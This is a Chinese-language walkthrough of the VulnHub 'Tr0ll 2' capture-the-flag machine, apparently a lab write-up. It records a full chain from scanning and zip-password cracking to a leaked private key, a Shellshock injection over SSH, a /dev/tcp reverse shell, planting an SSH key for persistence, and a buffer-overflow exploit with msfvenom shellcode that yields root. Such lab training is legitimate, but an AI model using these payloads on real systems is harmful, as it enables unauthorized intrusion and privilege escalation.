# Troll 2

> https://download.vulnhub.com/tr0ll/Tr0ll2.rar
>
> https://download.vulnhub.com/tr0ll/Tr0ll2_vbox.rar

靶场IP：`192.168.32.173`

![image-20220718103332901](../../.gitbook/assets/image-20220718103332901.png)

扫描对外端口

```
┌──(root💀kali)-[/opt/linux-exploit-suggester]
└─# nmap -p 1-65535 192.168.32.173                                                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 22:34 EDT
Nmap scan report for 192.168.32.173
Host is up (0.0045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:92:0B:06 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds

```

访问FTP，没有匿名登陆

![image-20220718103500929](../../.gitbook/assets/image-20220718103500929.png)

使用`Tr0ll:Tr0ll`进行访问

```
┌──(root💀kali)-[/tmp]
└─# ftp 192.168.32.173
Connected to 192.168.32.173.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.32.173:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.01 secs (133.2210 kB/s)

```

解压目录，需要密码

![image-20220718121400896](../../.gitbook/assets/image-20220718121400896.png)

访问80端口

![image-20220718103543646](../../.gitbook/assets/image-20220718103543646.png)

对WEB进行目录爆破

![image-20220718103635950](../../.gitbook/assets/image-20220718103635950.png)

访问robot文件

![image-20220718103655093](../../.gitbook/assets/image-20220718103655093.png)

使用这个目录字典进行爆破

```
┌──(root💀kali)-[/tmp]
└─# dirb http://192.168.32.173 mulu.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 17 22:37:53 2022
URL_BASE: http://192.168.32.173/
WORDLIST_FILES: mulu.txt

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://192.168.32.173/ ----
+ http://192.168.32.173//noob (CODE:301|SIZE:315)                                                                   
+ http://192.168.32.173//keep_trying (CODE:301|SIZE:322)                                                            
+ http://192.168.32.173//dont_bother (CODE:301|SIZE:322)                                                            
+ http://192.168.32.173//ok_this_is_it (CODE:301|SIZE:324)                                                          
                                                                                                                    
-----------------
END_TIME: Sun Jul 17 22:37:53 2022
DOWNLOADED: 21 - FOUND: 4

```

访问这几个目录，都是显示同一张图片

![image-20220718103929156](../../.gitbook/assets/image-20220718103929156.png)

查看页面源代码

![image-20220718103949219](../../.gitbook/assets/image-20220718103949219.png)

需要访问`/dont_bother/`才有信息

![image-20220718104347567](../../.gitbook/assets/image-20220718104347567.png)

访问`/y0ur_self`目录

![image-20220718104440623](../../.gitbook/assets/image-20220718104440623.png)

这些字典是base64加密

```
┌──(root💀kali)-[/tmp]
└─# cat answer.txt | base64 -d  > pass.txt
```

> ```
> base64 --decode answer.txt > decoded.txt
> ```

爆破压缩包密码

```
┌──(root💀kali)-[/tmp]
└─# fcrackzip -u -D -p pass.txt lmao.zip


PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL

```

解压成功，是一个公钥文件

```
┌──(root💀kali)-[/tmp]
└─# file noob                           
noob: PEM RSA private key
                                                                                                                     
┌──(root💀kali)-[/tmp]
└─# cat noob    
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
                                    
```

使用公钥SSH登录

```
┌──(root💀kali)-[/tmp]
└─# ssh noob@192.168.32.173 -i noob   
TRY HARDER LOL!
Connection to 192.168.32.173 closed.

```

查看具体SSH链接信息

![image-20220718121739480](../../.gitbook/assets/image-20220718121739480.png)

使用破壳漏洞

```
┌──(root💀kali)-[/tmp]
└─# ssh noob@192.168.32.173 -i noob  '() { :;}; echo Shellshock'
Shellshock
TRY HARDER LOL!
                                                                                                                     
┌──(root💀kali)-[/tmp]
└─# ssh noob@192.168.32.173 -i noob  '() { :;}; /bin/bash'      
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)

```

设置反弹shell

```
┌──(root💀kali)-[/tmp]
└─# ssh noob@192.168.32.173 -i noob '() { :;}; bash -i >& /dev/tcp/192.168.32.130/9999 0>&1'

```

![image-20220718122632513](../../.gitbook/assets/image-20220718122632513.png)

自己创建公钥，写入公钥

```
noob@Tr0ll2:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkRJczX8jfQF3VDcaXFq/OfG5GtLCTES4du0IgNnXgswgDuhiJWGjg4jflfEMuMJfix6MXSBOlPQKAYo95EsFDd9wgQjvg8tdXpMkM/g6VlC7eaSxqtGPTr7CzCEqgRkQZ+97Lg66I9s7AwygjA1osNUQZJiwRzpfhk7VfYQG/xG4t9OCCIeysQ1mJxIi3OQGhBtEtC2JJ1m2ikp4h/+yMfqdSijemo/5jf+yXjGzIs04ozVYfu33Rn7ELHBEveuNjtXgOyzZbVDVNfohD/4W/iK9SHA8Ytt1PwqzQr3Rz7G8K8CNF1Qo9dppHFyjoonCPZOjt8MCudqNvjslHIa6P root@kali" >> authorized_keys

```

寻找SUID二进制文件

```
noob@Tr0ll2:~$ /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
<000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null                    
-rwsr-xr-x 1 root root 31116 Apr  8  2012 /bin/su
-rwsr-xr-x 1 root root 67720 Mar 29  2012 /bin/umount
-rwsr-xr-x 1 root root 34740 Nov  8  2011 /bin/ping
-rwsr-xr-x 1 root root 88760 Mar 29  2012 /bin/mount
-rwsr-xr-x 1 root root 26252 Mar  2  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39116 Nov  8  2011 /bin/ping6
-rwsr-xr-x 1 root root 40292 Apr  8  2012 /usr/bin/chfn
-rwsr-xr-x 1 root root 30896 Apr  8  2012 /usr/bin/newgrp
-rwsr-xr-x 2 root root 69708 May 31  2012 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 41284 Apr  8  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 56208 Jul 28  2011 /usr/bin/mtr
-rwsr-xr-x 2 root root 69708 May 31  2012 /usr/bin/sudo
-rwsr-xr-x 1 root root 31748 Apr  8  2012 /usr/bin/chsh
-rwsr-xr-x 1 root root 14012 Nov  8  2011 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 57956 Apr  8  2012 /usr/bin/gpasswd
-rwsr-xr-- 1 root dip 273272 Feb  4  2011 /usr/sbin/pppd
-rwsr-xr-x 1 root root 9728 Aug 27  2014 /usr/lib/pt_chown
drwsr-xr-x 3 root root 4096 Oct 14  2014 /nothing_to_see_here
drwsr-xr-x 5 root root 4096 Oct  4  2014 /nothing_to_see_here/choose_wisely
drwsr-xr-x 2 root root 4096 Oct  5  2014 /nothing_to_see_here/choose_wisely/door2
drwsr-xr-x 2 root root 4096 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3
drwsr-xr-x 2 root root 4096 Oct  4  2014 /nothing_to_see_here/choose_wisely/door1

```

为了进一步检查，我们运行 r00t 程序并将一千个字符"A"作为输入传递给它。然后程序返回一条"Segmentation fault"消息，表明存在缓冲区溢出漏洞。

![image-20220718135104228](../../.gitbook/assets/image-20220718135104228.png)

现在我们使用名为"pattern_create.rb"的 metasploit 工具创建具有指定长度的不同字符模式（在我们的例子中，我们使用 1000 作为长度），因此我们将该模式传递给易受攻击的程序以帮助我们确定 EIP（扩展指令指针）位置。然后我们获取覆盖 EIP 的返回值并将其传递给 pattern_offset.rb。

```
┌──(root💀kali)-[~/Desktop]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

```

> **注意：** r00t 程序经常更改其门目录，因此您需要牢记这一点。还有一个"硬模式"可以阻止您使用"ls"2 分钟。另外，请记住，如果您看到该消息"干得好，待命，正在执行 root shell……"。知道这是一个陷阱，您的连接将被关闭，因此您需要立即使用"Ctrl + c"终止程序并将您的目录更改为任何其他门。



```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ gdb -q r00t
Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.                                           
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B                                             
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B                                                                                                          
                                                                                                                     
Program received signal SIGSEGV, Segmentation fault.                                                                 
0x6a413969 in ?? ()                                                                                                  
(gdb)                 
```

然后我们使用另一个名为"patern_offset.rb"的metasploit工具来帮助我们确定EIP位置，其中偏移量表示缓冲区起始地址和EBP（扩展基指针）地址之间的距离，以及EBP地址上方的四个字节是 EIP（或返回地址）的位置，其大小为四个字节。

```
┌──(root💀kali)-[~/Desktop]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a413969

[*] Exact match at offset 268

```

随后，我们运行 r00t 程序并将 268 个字符的"A"和 4 个字符的"B"传递给它，以确保我们可靠地控制 EIP。从返回值"0x42424242"，即十六进制中的四个 B，我们确信我们可以可靠地覆盖 EIP。

```
gdb -q r00t
r $(python -c 'print "A" * 268 + "B" * 4')
```

![image-20220718135450234](../../.gitbook/assets/image-20220718135450234.png)

现在我们正在寻找 ESP（扩展堆栈指针）地址以将其传递给 r00t 程序，而不是四个"B"。因此，我们决定在修改后的环境中使用 gdb 调试器运行 r00t 程序。我们取消设置所有环境变量（LINES 和 COLUMNS）以避免在没有调试器的情况下运行 r00t 程序时获得无效的 ESP 地址，因为当任何程序被执行时，环境变量被推入堆栈，因此当您运行时堆栈可能看起来更深调试器中的程序比正常运行它可能会影响 ESP 地址。我们运行 r00t 程序并将之前的输入传递给它，但这次我们添加了 16 个 nop sled "\x90" 以确保执行我们稍后将创建的 shellcode 和 100 个字符 "C"稍后将被 shellcode 替换。

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ env - gdb r00t
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /nothing_to_see_here/choose_wisely/door2/r00t...done.
(gdb) 

```

```
(gdb) show env
LINES=51
COLUMNS=117
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 16 + "C" * 100')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 16 + "C" * 100')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers
eax            0x184    388
ecx            0x0      0
edx            0x0      0
ebx            0xb7fd1ff4       -1208147980
esp            0xbffffc80       0xbffffc80
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

```

![image-20220718135641398](../../.gitbook/assets/image-20220718135641398.png)

然后我们使用 msfvenom 创建我们的 shellcode，其中排除了以下常见的坏字符

- \x00：空字节
- \x0a：换行
- \x0d：回车

这些坏字符可能会破坏 shellcode 并导致漏洞利用失败。

```
┌──(root💀kali)-[~/Desktop]
└─# msfvenom -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d'

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of py file: 357 bytes
buf =  b""
buf += b"\xba\xd6\xd3\x1b\x41\xda\xc0\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x0b\x31\x50\x15\x03\x50\x15\x83\xe8\xfc\xe2"
buf += b"\x23\xb9\x10\x19\x52\x6c\x41\xf1\x49\xf2\x04\xe6\xf9"
buf += b"\xdb\x65\x81\xf9\x4b\xa5\x33\x90\xe5\x30\x50\x30\x12"
buf += b"\x4a\x97\xb4\xe2\x64\xf5\xdd\x8c\x55\x8a\x75\x51\xfd"
buf += b"\x3f\x0c\xb0\xcc\x40"

```

之后，我们通过将 ESP 地址修改为逆序（通常称为小端字节序）来准备我们的恶意输入。然后我们在修改后的环境中运行程序，并将包含 shellcode 的恶意输入传递给它，最后我们得到了一个 root shell 和 Proof.txt 文件。

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ env - ./r00t $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 16 + "\xdb\xd6\xb8\xac\x61\x13\xf8\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\x59\x0b\x18\xa0\x38\x9e\x78\x38\x17\x7c\x0c\x5f\x0f\xad\x7d\xc8\xcf\xd9\xae\x6a\xa6\x77\x38\x89\x6a\x60\x32\x4e\x8a\x70\x6c\x2c\xe3\x1e\x5d\xc3\x9b\xde\xf6\x70\xd2\x3e\x35\xf6"')
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# cat /root/

```

```
# cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4 
```

